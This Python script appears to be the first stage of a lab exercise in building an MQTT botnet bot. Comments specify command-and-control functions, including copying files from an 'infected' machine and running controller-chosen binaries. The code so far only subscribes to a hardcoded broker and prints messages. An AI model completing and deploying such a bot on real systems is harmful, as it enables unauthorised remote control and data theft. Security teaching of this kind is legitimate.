# 5. Minimal required functionality of the bots:
#   1. announcing the presence of the bot to the controller if asked.
#   2. listing users currently logged in the "infected" device (output of 'w' command).
#   3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
#   4. id of the user running the bot (output of 'id command').
#   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
#   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').

import paho.mqtt.client as mqtt


# broker = central server that receives all messages
#          and then routes them to the correct destinations.
BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"



def on_message(client, userdata, msg):
    # print whatever it hears for now
    print(f"Heard: {msg.payload.decode()}")

# both the bot and the controller are 'clients'
# client = mqtt.Client()
# added version to avoid warning
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)


# callback when a message is received
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC)

print("Bot is listening...")

# prevents the script from ending.
client.loop_forever()

